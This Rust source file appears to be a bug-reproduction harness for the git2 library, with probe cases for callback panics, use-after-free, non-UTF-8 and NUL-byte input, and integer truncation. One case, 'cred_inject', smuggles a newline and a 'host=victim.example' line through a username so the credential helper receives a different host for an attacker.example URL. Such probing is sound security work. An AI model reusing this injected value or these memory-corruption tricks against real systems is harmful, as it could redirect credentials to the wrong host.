#![allow(deprecated, unused)]
use git2::*;
use std::fs;
use std::path::Path;
use std::panic::{catch_unwind, AssertUnwindSafe};
use tempfile::TempDir;

fn init() -> (TempDir, Repository) {
    let td = TempDir::new().unwrap();
    let repo = Repository::init(td.path()).unwrap();
    { let mut c = repo.config().unwrap(); c.set_str("user.name","n").unwrap(); c.set_str("user.email","e@x").unwrap(); }
    {
        fs::write(td.path().join("a.txt"), "one\n").unwrap();
        let mut idx = repo.index().unwrap();
        idx.add_path(Path::new("a.txt")).unwrap();
        idx.write().unwrap();
        let t = idx.write_tree().unwrap();
        let tree = repo.find_tree(t).unwrap();
        let sig = repo.signature().unwrap();
        repo.commit(Some("HEAD"), &sig, &sig, "init", &tree, &[]).unwrap();
    }
    (td, repo)
}
fn commit_file(td:&TempDir, repo:&Repository, name:&str, content:&str, msg:&str)->Oid{
    fs::write(td.path().join(name), content).unwrap();
    let mut idx = repo.index().unwrap();
    idx.add_path(Path::new(name)).unwrap();
    idx.write().unwrap();
    let t = idx.write_tree().unwrap();
    let tree = repo.find_tree(t).unwrap();
    let sig = repo.signature().unwrap();
    let head = repo.head().unwrap().peel_to_commit().unwrap();
    repo.commit(Some("HEAD"), &sig, &sig, msg, &tree, &[&head]).unwrap()
}
// a stale-panic detector: runs an unrelated tree walk afterwards
fn after(repo:&Repository){
    let tree = repo.head().unwrap().peel_to_tree().unwrap();
    let mut called=0;
    let r = catch_unwind(AssertUnwindSafe(|| tree.walk(TreeWalkMode::PreOrder, |_,_| {called+=1; TreeWalkResult::Ok})));
    match r { Ok(v)=>println!("later unrelated tree.walk: returned {:?}, callback calls={}", v, called),
              Err(p)=>println!("later unrelated tree.walk: PANICKED with stale payload {:?}, calls={}", p.downcast_ref::<&str>(), called) }
}
fn quiet(){ std::panic::set_hook(Box::new(|_|{})); }

fn main(){
    let name = std::env::args().nth(1).unwrap();
    match name.as_str() {
"index_null_add" => { let (td,repo)=init(); fs::write(td.path().join("b.txt"),"x").unwrap();
    let mut idx=repo.index().unwrap(); let mut cb=|p:&Path,m:&[u8]|{println!("cb {:?} {:?}",p,m);0};
    println!("{:?}", idx.add_all(Vec::<&str>::new(), IndexAddOption::DEFAULT, Some(&mut cb))); }
"index_null_update" => { let (td,repo)=init(); fs::write(td.path().join("a.txt"),"changed").unwrap();
    let mut idx=repo.index().unwrap(); let mut cb=|p:&Path,m:&[u8]|{println!("cb {:?} {:?}",p,m);0};
    println!("{:?}", idx.update_all(Vec::<&str>::new(), Some(&mut cb))); }
"index_null_remove" => { let (td,repo)=init();
    let mut idx=repo.index().unwrap(); let mut cb=|p:&Path,m:&[u8]|{println!("cb {:?} {:?}",p,m);0};
    println!("{:?}", idx.remove_all(Vec::<&str>::new(), Some(&mut cb))); }
"tag_foreach_panic" => { quiet(); let (td,repo)=init(); let h=repo.head().unwrap().target().unwrap(); let o=repo.find_object(h,None).unwrap(); repo.tag_lightweight("t1",&o,false).unwrap();
    let r=catch_unwind(AssertUnwindSafe(|| repo.tag_foreach(|_,_| panic!("user panic in tag_foreach")))); println!("tag_foreach: {:?}", r.map_err(|_|"propagated")); after(&repo); }
"odb_foreach_panic" => { quiet(); let (td,repo)=init(); let odb=repo.odb().unwrap();
    let r=catch_unwind(AssertUnwindSafe(|| odb.foreach(|_| panic!("user panic in odb foreach")))); println!("odb.foreach: {:?}", r.map_err(|_|"propagated")); after(&repo); }
"mergehead_panic" => { quiet(); let (td,mut repo)=init(); let h=repo.head().unwrap().target().unwrap(); fs::write(repo.path().join("MERGE_HEAD"),format!("{}\n",h)).unwrap();
    let r=catch_unwind(AssertUnwindSafe(|| repo.mergehead_foreach(|_| panic!("user panic in mergehead")))); println!("mergehead_foreach: {:?}", r.map_err(|_|"propagated")); after(&repo); }
"fetchhead_nonutf8" => { quiet(); let (td,repo)=init(); let h=repo.head().unwrap().target().unwrap();
    let mut c=format!("{}\t\tbranch '", h).into_bytes(); c.extend_from_slice(b"\xff\xfe' of /x\n"); fs::write(repo.path().join("FETCH_HEAD"),c).unwrap();
    let mut n=0; let r=catch_unwind(AssertUnwindSafe(|| repo.fetchhead_foreach(|a,b,_,_| {n+=1; println!("cb {:?} {:?}",a,b); true}))); println!("fetchhead_foreach: {:?}, cb calls={}", r.map_err(|_|"propagated"), n); after(&repo); }
"stash_panic" => { quiet(); let (td,mut repo)=init(); fs::write(td.path().join("a.txt"),"dirty\n").unwrap(); let s=repo.signature().unwrap(); repo.stash_save(&s,"m",None).unwrap();
    let r=catch_unwind(AssertUnwindSafe(|| repo.stash_foreach(|_,_,_| panic!("user panic in stash")))); println!("stash_foreach: {:?}", r.map_err(|_|"propagated")); after(&repo); }
"checkout_progress_panic" => { quiet(); let (td,repo)=init(); fs::remove_file(td.path().join("a.txt")).unwrap();
    let mut b=build::CheckoutBuilder::new(); b.force(); b.progress(|_,_,_| panic!("user panic in progress"));
    let r=catch_unwind(AssertUnwindSafe(|| repo.checkout_head(Some(&mut b)))); println!("checkout_head: {:?}", r.map_err(|_|"propagated")); after(&repo); }
"checkout_notify_panic" => { quiet(); let (td,repo)=init(); fs::write(td.path().join("a.txt"),"dirty\n").unwrap();
    let mut b=build::CheckoutBuilder::new(); b.force(); b.notify_on(CheckoutNotificationType::all()); b.notify(|_,_,_,_,_| panic!("user panic in notify"));
    let r=catch_unwind(AssertUnwindSafe(|| repo.checkout_head(Some(&mut b)))); println!("checkout_head: {:?}", r.map_err(|_|"propagated")); println!("worktree a.txt={:?}",fs::read_to_string(td.path().join("a.txt"))); after(&repo); }
"checkout_notify_false" => { let (td,repo)=init(); fs::write(td.path().join("a.txt"),"dirty\n").unwrap();
    let mut n=0; let mut b=build::CheckoutBuilder::new(); b.force(); b.notify_on(CheckoutNotificationType::all()); b.notify(|_,_,_,_,_| {n+=1; false});
    let r=repo.checkout_head(Some(&mut b)); drop(b); println!("checkout_head cancelled by notify=false: {:?}, notify calls={} a.txt={:?}", r, n, fs::read_to_string(td.path().join("a.txt"))); }
"dry_run" => { let (td,repo)=init(); commit_file(&td,&repo,"a.txt","two\n","second");
    let c=repo.head().unwrap().peel_to_commit().unwrap(); let p=c.parent(0).unwrap();
    fs::write(td.path().join("a.txt"),"dirty\n").unwrap();
    let mut n=0; { let mut b=build::CheckoutBuilder::new(); b.dry_run(); b.notify_on(CheckoutNotificationType::all()); b.notify(|w,pa,_,_,_| {n+=1; println!("notify {:?} {:?}",w,pa); true});
    println!("dry_run on conflicting tree: {:?}", repo.checkout_tree(p.as_object(), Some(&mut b))); } println!("notify calls={}",n);
    { let mut b=build::CheckoutBuilder::new(); let mut m=0; b.notify_on(CheckoutNotificationType::all()); b.notify(|_,_,_,_,_| {println!("safe notify");true});
    println!("safe on same (for comparison): {:?}", repo.checkout_tree(p.as_object(), Some(&mut b)).map_err(|e|e.to_string())); }
    let mut b=build::CheckoutBuilder::new(); b.dry_run().force();
    println!("dry_run().force(): {:?}; a.txt={:?}", repo.checkout_tree(p.as_object(), Some(&mut b)), fs::read_to_string(td.path().join("a.txt"))); let mut b=build::CheckoutBuilder::new(); b.force();
    println!("force() alone: {:?}; a.txt={:?}", repo.checkout_tree(p.as_object(), Some(&mut b)), fs::read_to_string(td.path().join("a.txt"))); }
"recreate_order" => { let (td,repo)=init(); fs::remove_file(td.path().join("a.txt")).unwrap();
    let mut b=build::CheckoutBuilder::new(); b.recreate_missing(true).safe(); repo.checkout_head(Some(&mut b)).unwrap(); println!("recreate_missing(true).safe(): exists={}", td.path().join("a.txt").exists());
    let mut b=build::CheckoutBuilder::new(); b.safe().recreate_missing(true); repo.checkout_head(Some(&mut b)).unwrap(); println!("safe().recreate_missing(true): exists={}", td.path().join("a.txt").exists()); }
"skip_reuc" => { let (td,repo)=init(); let base=repo.head().unwrap().peel_to_commit().unwrap().id();
    let a=commit_file(&td,&repo,"a.txt","ours\n","ours");
    repo.set_head_detached(base).unwrap(); let mut b=build::CheckoutBuilder::new(); b.force(); repo.checkout_head(Some(&mut b)).unwrap();
    let t=commit_file(&td,&repo,"a.txt","theirs\n","theirs");
    let ca=repo.find_commit(a).unwrap(); let ct=repo.find_commit(t).unwrap();
    let mut o=MergeOptions::new(); println!("default: {:?}", repo.merge_commits(&ca,&ct,Some(&o)).map(|i|i.has_conflicts()));
    o.skip_reuc(true); println!("skip_reuc(true): {:?}", repo.merge_commits(&ca,&ct,Some(&o)).map(|i|i.has_conflicts()).map_err(|e|e.to_string())); }
"revwalk_inner" => { let (td,repo)=init(); commit_file(&td,&repo,"a.txt","two\n","2"); commit_file(&td,&repo,"a.txt","three\n","3"); let h=repo.head().unwrap().target().unwrap();
    let w=repo.revwalk().unwrap();
    let mut w={ let mut s=vec![1u8;32]; let mut cb=|_:Oid|{ s.push(1); println!("hide cb reached; captured vec len={}",s.len()); false };
        let wc=w.with_hide_callback(&mut cb).unwrap(); wc.into_inner().unwrap() };
    let mut junk=[0xABu8;4096]; std::hint::black_box(&mut junk);
    w.push(h).unwrap(); println!("{:?}", w.next()); println!("{:?}", w.next()); println!("{:?}", w.next()); }
"annotated_ref" => { let (td,repo)=init(); let h=repo.head().unwrap().target().unwrap(); let a=repo.find_annotated_commit(h).unwrap(); println!("{:?}",a.refname()); }
"rebase_setup" | "rebase_exec" | "rebase_op_uaf" | "rebase_opts_uaf" => { let (td,repo)=init();
    let base=repo.head().unwrap().peel_to_commit().unwrap().id(); let hd=repo.head().unwrap().name().unwrap().to_string();
    let t=commit_file(&td,&repo,"b.txt","b\n","topic");
    let br=repo.find_annotated_commit(t).unwrap();
    repo.set_head_detached(base).unwrap(); let mut b=build::CheckoutBuilder::new(); b.force(); repo.checkout_head(Some(&mut b)).unwrap();
    let on=commit_file(&td,&repo,"c.txt","c\n","onto");
    repo.set_head_detached(t).unwrap(); let mut b=build::CheckoutBuilder::new(); b.force(); repo.checkout_head(Some(&mut b)).unwrap();
    let u=repo.find_annotated_commit(on).unwrap();
    if name=="rebase_exec" { let mut r=repo.rebase(Some(&br),Some(&u),None,None).unwrap(); let op=r.next().unwrap().unwrap(); println!("kind {:?}",op.kind()); println!("exec {:?}",op.exec()); }
    if name=="rebase_op_uaf" { let mut r=repo.rebase(Some(&br),Some(&u),None,None).unwrap(); let op=r.next().unwrap().unwrap(); drop(r); let v=vec![0x41u8;4096]; std::hint::black_box(&v); println!("op after rebase dropped: kind {:?} id {}",op.kind(),op.id()); }
    if name=="rebase_opts_uaf" { let mut r={ let mut cb=build::CheckoutBuilder::new(); let mut ct=0usize; cb.progress(move |_,_,_|{ct+=1; println!("progress cb, ct={}",ct);}); let mut o=RebaseOptions::new(); o.checkout_options(cb); repo.rebase(Some(&br),Some(&u),None,Some(&mut o)).unwrap() };
        println!("options dropped"); let mut junk=vec![0xCDu8;8192]; std::hint::black_box(&mut junk); let n=r.next(); println!("{:?}", n.map(|x|x.map(|o|o.id()))); }
    }
"buf_null" => { let b=Buf::new(); println!("empty buf: {:?}", b.as_str()); }
"buf_null_deref" => { let b=Buf::new(); let s:&[u8]=&b; println!("{:?}",s.len()); }
"prettify_empty" => { println!("{:?}", message_prettify("",None)); }
"prettify_nonutf8" => { println!("{:?}", message_prettify(vec![0xffu8,b'\n'],None)); }
"empty_blob" => { let (td,repo)=init(); let id=repo.blob(b"").unwrap(); let bl=repo.find_blob(id).unwrap(); println!("{:?}",bl.content()); let odb=repo.odb().unwrap(); let o=odb.read(id).unwrap(); println!("{:?}",o.data()); }
"workdir_uaf" => { let (td,repo)=init(); let td2=TempDir::new().unwrap(); let w=repo.workdir().unwrap(); println!("before {:?}",w); repo.set_workdir(td2.path(),false).unwrap(); let j=vec![0x41u8;w.as_os_str().len()]; std::hint::black_box(&j); println!("after {:?} (stale borrow)",w); }
"namespace_uaf" => { let (td,repo)=init(); repo.set_namespace("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa").unwrap(); let ns=repo.namespace().unwrap(); println!("before {:?}",ns); repo.set_namespace("b").unwrap(); let j=vec![0x41u8;46]; std::hint::black_box(&j); println!("after {:?}",ns); }
"attr_uaf" => { let (td,repo)=init(); fs::write(td.path().join(".gitattributes"),"a.txt foo=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n").unwrap();
    let a=repo.get_attr(Path::new("a.txt"),"foo",AttrCheckFlags::default()).unwrap().unwrap(); println!("before {:?}",a);
    std::thread::sleep(std::time::Duration::from_millis(1100));
    fs::write(td.path().join(".gitattributes"),"a.txt foo=bbbbbbbbbbbbbbbbbbbbbbbbbbbb extra\n").unwrap();
    let b=repo.get_attr(Path::new("a.txt"),"foo",AttrCheckFlags::default()).unwrap(); println!("second {:?}",b); let j=vec![0x41u8;4096]; std::hint::black_box(&j); println!("first after {:?}",String::from_utf8_lossy(a.as_bytes())); }
"refspec_uaf" => { let (td,repo)=init(); repo.remote("origin","/nowhere").unwrap(); let s={ let r=repo.find_remote("origin").unwrap(); r.get_refspec(0).unwrap() }; let j=vec![0x41u8;64]; std::hint::black_box(&j); println!("{:?}",String::from_utf8_lossy(s.bytes())); }
"pathspec_uaf" => { let (td,repo)=init(); let h=repo.head().unwrap().peel_to_tree().unwrap(); let ps=Pathspec::new(["a.txt"]).unwrap();
    let list={ let d=repo.diff_tree_to_tree(None,Some(&h),None).unwrap(); ps.match_diff(&d,PathspecFlags::DEFAULT).unwrap() }; let j=vec![0x41u8;256]; std::hint::black_box(&j);
    let e=list.diff_entry(0).unwrap(); println!("{:?}", e.new_file().path_bytes().map(|b|String::from_utf8_lossy(b).to_string())); }
"diff_buf_mut" => { let p=b"diff --git a/f b/f\nindex 1111111..2222222 100644\n--- a/f\n+++ b/f\n@@ -1 +1 @@\n-oldline\n+newline\n";
    let mut buf=p.to_vec(); let d=Diff::from_buffer(&buf).unwrap(); let print=|d:&Diff|{d.print(DiffFormat::Patch,|_,_,l|{ if l.origin()=='+'||l.origin()=='-' {println!("{} {:?}",l.origin(),String::from_utf8_lossy(l.content()));} true}).unwrap();}; print(&d); buf.iter_mut().for_each(|b|*b=b'X'); println!("-- after overwriting input buffer"); print(&d); drop(buf); println!("-- after freeing input buffer"); let j=vec![0x41u8;p.len()]; std::hint::black_box(&j); print(&d); }
"indexer_odb_uaf" => { let (td,repo)=init(); let dir=TempDir::new().unwrap();
    let mut pb=repo.packbuilder().unwrap(); let h=repo.head().unwrap().target().unwrap(); pb.insert_commit(h).unwrap(); let mut buf=Buf::new(); pb.write_buf(&mut buf).unwrap();
    let mut ix={ let odb=Odb::new().unwrap(); Indexer::new(Some(&odb),dir.path(),0,true).unwrap() }; println!("odb dropped");
    use std::io::Write; println!("{:?}", ix.write(&buf).map_err(|e|e.to_string())); println!("{:?}", ix.commit().map_err(|e|e.to_string())); }
"apply_opts_move" => { let (td,repo)=init(); let id=commit_file(&td,&repo,"a.txt","two\n","2"); let c=repo.find_commit(id).unwrap(); let d=repo.diff_tree_to_tree(Some(&c.parent(0).unwrap().tree().unwrap()),Some(&c.tree().unwrap()),None).unwrap();
    fn mk<'a>()->ApplyOptions<'a>{ let mut o=ApplyOptions::new(); o.delta_callback(|_|{println!("delta cb");true}); o }
    #[inline(never)] fn clobber(){ let mut j=[0x5Au8;16384]; std::hint::black_box(&mut j); }
    let mut o=Box::new(mk()); clobber(); println!("calling apply"); let t=c.parent(0).unwrap().tree().unwrap(); println!("{:?}", repo.apply_to_tree(&t,&d,Some(&mut *o)).map(|_|()) ); }
"stash_opts_move" => { let (td,mut repo)=init(); fs::write(td.path().join("a.txt"),"dirty\n").unwrap(); let s=repo.signature().unwrap(); repo.stash_save(&s,"m",None).unwrap();
    fn mk<'a>()->StashApplyOptions<'a>{ let mut o=StashApplyOptions::new(); o.progress_cb(|p|{println!("progress {:?}",p);true}); o }
    #[inline(never)] fn clobber(){ let mut j=[0x5Au8;16384]; std::hint::black_box(&mut j); }
    let mut o=Box::new(mk()); clobber(); println!("calling stash_apply"); println!("{:?}", repo.stash_apply(0,Some(&mut *o))); }
"blame_sig" => { let (td,repo)=init(); let b=repo.blame_file(Path::new("a.txt"),None).unwrap(); let bb=b.blame_buffer(b"one\nnew line\n").unwrap(); println!("hunks {}",bb.len());
    for h in bb.iter(){ println!("hunk id {} ",h.final_commit_id()); println!("name {:?}",h.final_signature().name()); } }
"diff_mode" => { let p=b"diff --git a/f b/f\nold mode 100600\nnew mode 100644\n"; let d=Diff::from_buffer(p).unwrap(); let e=d.get_delta(0).unwrap(); println!("{:?}",e.old_file().mode()); }
"tree_mode" => { let (td,repo)=init(); let bl=repo.blob(b"x").unwrap(); let mut raw=b"100600 f\0".to_vec(); raw.extend_from_slice(bl.as_bytes()); let odb=repo.odb().unwrap(); let tid=odb.write(ObjectType::Tree,&raw).unwrap(); let t=repo.find_tree(tid).unwrap();
    let d=repo.diff_tree_to_tree(None,Some(&t),None).unwrap(); let e=d.get_delta(0).unwrap(); println!("{:?}",e.new_file().mode()); }
"diff_binary_null" => { let (td,repo)=init(); let a=repo.blob(b"\0bin1").unwrap(); let b=repo.blob(b"\0bin2").unwrap(); let (a,b)=(repo.find_blob(a).unwrap(),repo.find_blob(b).unwrap());
    let mut bcb=|_:DiffDelta,bin:DiffBinary|{ println!("contains_data {}",bin.contains_data()); println!("old len {}",bin.old_file().data().len()); true};
    println!("{:?}", repo.diff_blobs(Some(&a),None,Some(&b),None,None,None,Some(&mut bcb),None,None)); }
"names_nonutf8" => { quiet(); let (td,repo)=init(); let h=repo.head().unwrap().target().unwrap();
    use std::os::unix::ffi::OsStrExt; let p=repo.path().join("refs/heads").join(std::ffi::OsStr::from_bytes(b"\xff\xfe")); fs::write(p,format!("{}\n",h)).unwrap();
    std::panic::set_hook(Box::new(|i|println!("PANIC {}",i)));
    let mut rs=repo.references().unwrap(); let names:Vec<_>=rs.names().map(|n|n.map(|s|s.to_string())).collect(); println!("{:?}",names); }
"message_nonutf8" => { let (td,repo)=init(); fs::write(repo.path().join("MERGE_MSG"),b"\xff\xfe\n").unwrap(); println!("{:?}",repo.message()); }
"remote_head_nonutf8" => { let (td,repo)=init(); let h=repo.head().unwrap().target().unwrap(); use std::os::unix::ffi::OsStrExt; let p=repo.path().join("refs/heads").join(std::ffi::OsStr::from_bytes(b"\xff\xfe")); fs::write(p,format!("{}\n",h)).unwrap();
    let (td2,r2)=init(); let mut rm=r2.remote("src",td.path().to_str().unwrap()).unwrap(); rm.connect(Direction::Fetch).unwrap(); for l in rm.list().unwrap(){ println!("{}",l.name()); } }
"update_tips_nonutf8" => { let (td,repo)=init(); let h=repo.head().unwrap().target().unwrap(); use std::os::unix::ffi::OsStrExt; let p=repo.path().join("refs/heads").join(std::ffi::OsStr::from_bytes(b"\xff\xfe")); fs::write(p,format!("{}\n",h)).unwrap();
    let (td2,r2)=init(); let mut rm=r2.remote("src",&format!("file://{}",td.path().display())).unwrap(); let mut cb=RemoteCallbacks::new(); cb.update_tips(|n,_,_|{println!("tip {}",n);true}); let mut fo=FetchOptions::new(); fo.remote_callbacks(cb); println!("{:?}", rm.fetch(&[] as &[&str],Some(&mut fo),None)); }
"describe_nonutf8" => { let (td,repo)=init(); let h=repo.head().unwrap().target().unwrap(); use std::os::unix::ffi::OsStrExt; let d=repo.path().join("refs/tags"); let p=d.join(std::ffi::OsStr::from_bytes(b"v\xff")); fs::write(p,format!("{}\n",h)).unwrap();
    let mut o=DescribeOptions::new(); o.describe_tags(); let de=repo.describe(&o).unwrap(); println!("{:?}",de.format(None)); }
"worktree_nonutf8" => { let (td,repo)=init(); let d=TempDir::new().unwrap(); let wt=repo.worktree("w",&d.path().join("w"),None).unwrap(); fs::write(repo.path().join("worktrees/w/locked"),b"\xff\xfe").unwrap(); println!("{:?}",wt.is_locked()); }
"stash_nonutf8" => { quiet(); let (td,mut repo)=init(); fs::write(td.path().join("a.txt"),"dirty\n").unwrap(); let s=repo.signature().unwrap(); repo.stash_save(&s,"m",None).unwrap();
    let log=repo.path().join("logs/refs/stash"); let mut c=fs::read(&log).unwrap(); let t=c.iter().rposition(|b|*b==b'\t').unwrap(); c.truncate(t+1); c.extend_from_slice(b"\xff\xfe\n"); fs::write(&log,c).unwrap();
    let mut n=0; let r=catch_unwind(AssertUnwindSafe(|| repo.stash_foreach(|_,_,_|{n+=1;true}))); println!("stash_foreach: {:?}, calls={}",r.map_err(|_|"propagated"),n); after(&repo); }
"get_path_panic" => { let (td,repo)=init(); let idx=repo.index().unwrap(); println!("{:?}",idx.get_path(Path::new("./a.txt"),0).is_some()); }
"matches_path_panic" => { let ps=Pathspec::new(["a"]).unwrap(); println!("{:?}",ps.matches_path(Path::new("/a"),PathspecFlags::DEFAULT)); }
"get_name_nul" => { let (td,repo)=init(); let t=repo.head().unwrap().peel_to_tree().unwrap(); println!("{:?}",t.get_name("a\0b").is_some()); }
"valid_name_nul" => { println!("{:?}",Reference::is_valid_name("refs/heads/a\0b")); }
"objtype_nul" => { println!("{:?}",ObjectType::from_str("blob\0")); }
"refspec_nul" => { let (td,repo)=init(); let r=repo.remote("o","/n").unwrap(); let s=r.get_refspec(0).unwrap(); println!("{:?}",s.transform("a\0b").map(|_|())); }
"txn_nul" => { let (td,repo)=init(); let mut t=repo.transaction().unwrap(); println!("{:?}",t.lock_ref("refs/a\0b")); }
"pb_hash" => { let (td,repo)=init(); let mut pb=repo.packbuilder().unwrap(); let h=repo.head().unwrap().target().unwrap(); pb.insert_commit(h).unwrap(); let mut b=Buf::new(); pb.write_buf(&mut b).unwrap(); println!("len {} count {} written {} hash {:?} name {:?}",b.len(),pb.object_count(),pb.written(),pb.hash(),pb.name()); let d=TempDir::new().unwrap(); pb.write(d.path(),0).unwrap(); println!("after write: hash {:?} name {:?}",pb.hash(),pb.name()); }
"cred_inject" => { let d=TempDir::new().unwrap(); let log=d.path().join("in"); let sc=d.path().join("h.sh"); fs::write(&sc,format!("#!/bin/sh\ncat > {}\necho password=x\n",log.display())).unwrap();
    use std::os::unix::fs::PermissionsExt; fs::set_permissions(&sc,fs::Permissions::from_mode(0o755)).unwrap();
    let cfgp=d.path().join("cfg"); let mut cfg=Config::new().unwrap(); cfg.add_file(&cfgp,ConfigLevel::App,false).unwrap(); cfg.set_str("credential.helper",&format!("!{}",sc.display())).unwrap();
    let mut h=CredentialHelper::new("https://attacker.example/repo"); h.config(&cfg); h.username(Some("x\nhost=victim.example\nprotocol=https")); println!("{:?}",h.execute()); println!("helper stdin:\n{}",fs::read_to_string(&log).unwrap());
    let mut h=CredentialHelper::new("https://10.1.2.3/repo"); h.config(&cfg); h.execute(); println!("IP url, helper stdin:\n{}",fs::read_to_string(&log).unwrap());
    let mut h=CredentialHelper::new("https://[::1]:8443/repo"); h.config(&cfg); h.execute(); println!("IPv6 url, helper stdin:\n{}",fs::read_to_string(&log).unwrap()); }
"cred_multi" => { let d=TempDir::new().unwrap(); let a=d.path().join("a.sh"); let b=d.path().join("b.sh"); fs::write(&a,"#!/bin/sh\necho username=u\necho password=fromA\n").unwrap(); fs::write(&b,"#!/bin/sh\nexit 0\n").unwrap();
    use std::os::unix::fs::PermissionsExt; fs::set_permissions(&a,fs::Permissions::from_mode(0o755)).unwrap(); fs::set_permissions(&b,fs::Permissions::from_mode(0o755)).unwrap();
    let cfgp=d.path().join("cfg"); fs::write(&cfgp,format!("[credential]\n\thelper = !{}\n\thelper = !{}\n",a.display(),b.display())).unwrap(); let mut cfg=Config::new().unwrap(); cfg.add_file(&cfgp,ConfigLevel::App,false).unwrap();
    let mut h=CredentialHelper::new("https://h.example/r"); h.config(&cfg); println!("two helpers (first has creds, second empty): {:?}",h.execute()); }
"cred_port" => { let d=TempDir::new().unwrap(); let a=d.path().join("a.sh"); fs::write(&a,"#!/bin/sh\necho username=u\necho password=scoped-to-default-port\n").unwrap(); use std::os::unix::fs::PermissionsExt; fs::set_permissions(&a,fs::Permissions::from_mode(0o755)).unwrap();
    let cfgp=d.path().join("cfg"); fs::write(&cfgp,format!("[credential \"https://h.example\"]\n\thelper = !{}\n",a.display())).unwrap(); let mut cfg=Config::new().unwrap(); cfg.add_file(&cfgp,ConfigLevel::App,false).unwrap();
    let mut h=CredentialHelper::new("https://h.example:8443/r"); h.config(&cfg); println!("helper scoped to https://h.example asked for :8443 -> {:?}",h.execute()); }
"remote_create_err" => { let d=TempDir::new().unwrap(); let (td,_r)=init(); let mut b=build::RepoBuilder::new(); b.remote_create(|_,_,_| Err(Error::from_str("my specific reason"))); let r=b.clone(td.path().to_str().unwrap(),&d.path().join("c")); println!("{:?}",r.map(|_|()).map_err(|e|e.to_string())); }
"remote_list_empty" => { let d=TempDir::new().unwrap(); Repository::init_bare(d.path()).unwrap(); let (td,r)=init(); let mut rm=r.remote("o",&format!("file://{}",d.path().display())).unwrap(); rm.connect(Direction::Fetch).unwrap(); println!("{:?}",rm.list().unwrap().len()); }
"trunc" => { let (td,repo)=init(); let id=commit_file(&td,&repo,"a.txt","two\n","2"); let c=repo.find_commit(id).unwrap(); println!("parent_count {} parent(2^32)={:?} parent_id(2^32)={:?} parent(1)={:?}",c.parent_count(),c.parent(1usize<<32).map(|p|p.id()),c.parent_id(1usize<<32),c.parent(1).map(|p|p.id()).map_err(|e|e.code()));
    let b=repo.blame_file(Path::new("a.txt"),None).unwrap(); println!("blame len {} get_index(2^32).is_some()={}",b.len(),b.get_index(1usize<<32).is_some()); }
"time_ord" => { let (td,repo)=init(); let a=Signature::new("a","b",&Time::new(1,0)).unwrap(); let tree=repo.head().unwrap().peel_to_tree().unwrap(); let raw=format!("tree {}\nauthor a <b> 1 -0000\ncommitter a <b> 1 -0000\n\nm\n",tree.id()); let oid=repo.odb().unwrap().write(ObjectType::Commit,raw.as_bytes()).unwrap(); let c=repo.find_commit(oid).unwrap(); let t1=c.author().when(); let t2=Time::new(1,0); println!("sign {:?} vs {:?}: eq={} cmp={:?} ; commit.time().sign()={:?}",t1.sign(),t2.sign(),t1==t2,t1.cmp(&t2),c.time().sign()); }
"format_email" => { let (td,repo)=init(); let id=commit_file(&td,&repo,"a.txt","two\n","line one\nline two\n\nbody\n"); let c=repo.find_commit(id).unwrap(); let mut d=repo.diff_tree_to_tree(Some(&c.parent(0).unwrap().tree().unwrap()),Some(&c.tree().unwrap()),None).unwrap(); println!("summary {:?}",c.summary()); let b=d.format_email(1,1,&c,None).unwrap(); println!("{}",b.as_str().unwrap()); }
"walk_nonutf8" => { let (td,repo)=init(); let bl=repo.blob(b"x").unwrap(); let odb=repo.odb().unwrap(); let mut inner=b"100644 f\0".to_vec(); inner.extend_from_slice(bl.as_bytes()); let it=odb.write(ObjectType::Tree,&inner).unwrap(); let mut outer=b"40000 d\xff\0".to_vec(); outer.extend_from_slice(it.as_bytes()); let ot=odb.write(ObjectType::Tree,&outer).unwrap(); let t=repo.find_tree(ot).unwrap(); let mut n=0; let r=t.walk(TreeWalkMode::PreOrder,|root,e|{n+=1;println!("{:?} {:?}",root,e.name());TreeWalkResult::Ok}); println!("{:?} calls={}",r.map_err(|e|e.to_string()),n); }
"cert_nul" => { println!("n/a"); }
"submodules_abort" => { quiet(); let (td,repo)=init(); let body=std::env::args().nth(2).unwrap().replace("\\n","\n").replace("\\t","\t"); fs::write(td.path().join(".gitmodules"),body).unwrap(); let r=repo.submodules(); println!("{:?}",r.map(|v|v.iter().map(|s|s.name().map(|x|x.to_string())).collect::<Vec<_>>()).map_err(|e|e.to_string())); }
"merge_empty" => { let (td,repo)=init(); let e=repo.blob(b"").unwrap(); let mk=|m:u16|IndexEntry{ctime:IndexTime::new(0,0),mtime:IndexTime::new(0,0),dev:0,ino:0,mode:0o100644,uid:0,gid:0,file_size:0,id:e,flags:0,flags_extended:0,path:b"f".to_vec()}; let r=repo.merge_file_from_index(&mk(0),&mk(0),&mk(0),None).unwrap(); println!("len {:?}",r.content().len()); }
"odb_packwriter_leak" => { for _ in 0..1000 { let o=Odb::new().unwrap(); let _=o.packwriter().is_ok(); } println!("ok"); }

"tag_foreach_err" => { let (td,repo)=init(); fs::write(repo.path().join("refs/tags/bad"),"not an oid\n").unwrap(); let r=repo.tag_foreach(|_,_|true); println!("tag_foreach on corrupt tag ref: {:?}; find_reference: {:?}",r,repo.refname_to_id("refs/tags/bad").map_err(|e|e.to_string())); }
"indexer_panic" => { quiet(); let (td,repo)=init(); let dir=TempDir::new().unwrap(); let mut pb=repo.packbuilder().unwrap(); let h=repo.head().unwrap().target().unwrap(); pb.insert_commit(h).unwrap(); let mut buf=Buf::new(); pb.write_buf(&mut buf).unwrap();
    let mut ix=Indexer::new(None,dir.path(),0,false).unwrap(); ix.progress(|_| panic!("user panic in indexer progress")); use std::io::Write; let r=catch_unwind(AssertUnwindSafe(|| ix.write(&buf).map(|_|()).map_err(|e|e.to_string()))); println!("indexer.write: {:?}",r.map_err(|_|"propagated")); drop(ix); after(&repo); }
"tree_entry_eq" => { let (td,repo)=init(); let a=repo.blob(b"1").unwrap(); let b=repo.blob(b"2").unwrap(); let mut tb=repo.treebuilder(None).unwrap(); tb.insert("f",a,0o100644).unwrap(); let t1=repo.find_tree(tb.write().unwrap()).unwrap(); let mut tb=repo.treebuilder(None).unwrap(); tb.insert("f",b,0o100755).unwrap(); let t2=repo.find_tree(tb.write().unwrap()).unwrap(); let (e1,e2)=(t1.get(0).unwrap(),t2.get(0).unwrap()); println!("ids differ={} modes differ={} entries ==: {}",e1.id()!=e2.id(),e1.filemode()!=e2.filemode(),e1==e2); }
